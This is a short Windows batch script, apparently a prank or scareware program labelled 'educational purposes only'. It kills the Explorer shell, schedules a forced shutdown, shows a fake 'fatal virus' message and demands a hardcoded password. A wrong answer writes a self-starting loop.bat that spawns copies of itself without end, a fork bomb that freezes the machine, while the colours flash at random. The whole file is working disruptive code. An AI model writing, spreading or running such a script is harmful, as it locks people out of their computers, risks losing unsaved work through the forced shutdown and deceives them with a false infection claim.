:: 2023-09-02 Made By KickTheBall

:: It's for educational purposes only.
:: And we are not responsible for misuse.

:: If you enter the wrong password, your eyes will get tired.
:: And you will end up in an infinite loop.

@echo off
cls

color 17

taskkill /f /im explorer.exe
cls

shutdown -s -t 60
echo Your Computer has a fatal virus!
echo If the password is incorrect, it will proceed.
echo Also, if you don't answer within 60 seconds, it will proceed too.

set /p password=password(4word):
if %password%==0503 goto case2

:case1
echo start loop.bat > loop.bat
echo start loop.bat >> loop.bat
echo start loop.bat >> loop.bat

:A
set /a x= %random% %% 10
set /a y= %random% %% 10
echo WRONG PASSWORD...! password is incorrect.
color %x%%y%

start loop.bat
start loop.bat
start loop.bat
goto A

:case2
cls

echo password is correct.
shutdown -a
start C:\Windows\explorer.exe
pause